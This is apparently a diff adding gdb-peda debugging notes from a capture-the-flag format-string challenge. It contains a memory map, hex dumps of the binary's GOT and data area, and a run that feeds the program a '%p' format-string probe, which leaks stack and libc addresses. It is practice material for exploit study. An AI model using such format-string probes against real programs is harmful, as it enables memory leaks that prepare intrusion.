@@ -1,0 +1,48 @@
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x00401000         r--p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Write/format_write
+0x00401000         0x00402000         r-xp	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Write/format_write
+0x00402000         0x00403000         r--p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Write/format_write
+0x00403000         0x00404000         r--p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Write/format_write
+0x00404000         0x00405000         rw-p	/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Write/format_write
+0x00007ffff79e2000 0x00007ffff7bc9000 r-xp	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7bc9000 0x00007ffff7dc9000 ---p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dc9000 0x00007ffff7dcd000 r--p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcd000 0x00007ffff7dcf000 rw-p	/lib/x86_64-linux-gnu/libc-2.27.so
+0x00007ffff7dcf000 0x00007ffff7dd3000 rw-p	mapped
+0x00007ffff7dd3000 0x00007ffff7dfc000 r-xp	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7fd3000 0x00007ffff7fd5000 rw-p	mapped
+0x00007ffff7fd5000 0x00007ffff7ff7000 r--p	/etc/ld.so.cache
+0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
+0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
+0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.27.so
+0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+
+gdb-peda$ x/80gx 0x404000
+0x404000:	0x0000000000403e20	0x00007ffff7ffe170
+0x404010:	0x00007ffff7dea8f0	0x0000000000401030
+0x404020:	0x0000000000401040	0x0000000000401050
+0x404030:	0x0000000000401060	0x0000000000401070
+0x404040:	0x0000000000000000	0x0000000000000000
+0x404050 <stdout@@GLIBC_2.2.5>:	0x00007ffff7dce760	0x0000000000000000
+0x404060 <stdin@@GLIBC_2.2.5>:	0x00007ffff7dcda00	0x0000000000000000
+0x404070:	0x0000000000000000	0x0000000000000000
+0x404080:	0x0000000000000000	0x0000000000000000
+0x404090:	0x0000000000000000	0x0000000000000000
+
+gdb-peda$ x/80gx 0x40400c
+0x40400c:	0xf7dea8f000007fff	0x0040103000007fff
+0x40401c:	0x0040104000000000	0x0040105000000000
+0x40402c:	0x0040106000000000	0x0040107000000000
+0x40403c:	0x0000000000000000	0x0000000000000000
+0x40404c:	0xf7dce76000000000	0x0000000000007fff
+0x40405c:	0xf7dcda0000000000	0x0000000000007fff
+0x40406c <val>:	0x0000000000000000	0x0000000000000000
+0x40407c:	0x0000000000000000	0x0000000000000000
+
+mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_Write$ ./format_write 
+Enter your name: AAAAAAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p
+AAAAAAAA,0x7fffffffdd00,0x100,0x7ffff7af2031,0x11,0x7ffff7fd44c0,0x4141414141414141,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025
